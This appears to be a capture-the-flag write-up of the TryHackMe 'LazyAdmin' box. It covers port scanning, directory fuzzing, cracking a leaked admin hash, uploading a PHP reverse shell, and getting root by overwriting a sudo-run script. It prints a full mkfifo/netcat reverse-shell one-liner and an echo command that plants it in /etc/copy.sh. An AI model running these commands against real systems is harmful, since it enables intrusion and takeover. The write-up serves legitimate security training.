---
title: "LazyAdmin - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - LazyAdmin
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - thm
  - tryhackme
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## LazyAdmin
![](https://kar0nx.github.io/assets/images/writeup/efbb70493ba66dfbac4302c02ad8facf.jpeg)

## Reconnaissance

IP: 10.10.98.124
### NMAP

```
nmap -T4 -A -p- 10.10.98.124
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 07:33 EST
Nmap scan report for 10.10.98.124
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/27%OT=22%CT=1%CU=31069%PV=Y%DS=2%DC=T%G=Y%TM=67C0
OS:5BD6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508S
OS:T11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=
OS:68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=
OS:M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   42.96 ms 10.11.0.1
2   43.05 ms 10.10.98.124

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.43 seconds
```

As we can see only 2 ports are open it is ssh 22 - OpenSSH and http 80 - Apache httpd 2.4.18

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227133712.png)

Default apache page, let's fuff it 

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.98.124/FUZZ
```

we found /content but nothing interesting here, continue fuzzing 

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.98.124/content/FUZZ
```

in /content/inc/ we can find mysql backup file

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227140047.png)

we have login and password hash, try to crack it, https://crackstation.net/ and we got it

| Hash                             | Type | Result      |
| -------------------------------- | ---- | ----------- |
| 42f749ade7f9e195bf475f37a44cafcb | md5  | Password123 |
navigating to /content/as/ we have sweetrice login page, lets try credentials that we found 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227135810.png)

We got it, let's explore site we can create post and upload files. 
## Gaining access

Generate basic php reverse shell using https://www.revshells.com/
I used pentestmonkey version and .phtml extension , set nc on attacking machine.

```
nc -nvlp 5555  
```

We have shell, grab flag navigating to /home/itguy/user.txt

## Privilege Escalation

Start with "easy wins" like 

```
sudo -l
```

```
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

So let's see what backup.pl doing

```
cat /home/itguy/backup.pl
```

```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

executing script in /etc/copy.sh, now we need to check it

```
cat /etc/copy.sh
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

looks like simple nc script for reverse shell, I will edit it to mine ip and port

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.129.113 4444 >/tmp/f" > /etc/copy.sh
```

set nc on port 4444 and execute backup.pl with sudo

We have root

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250227144534.png)

flag is in /root/root.txt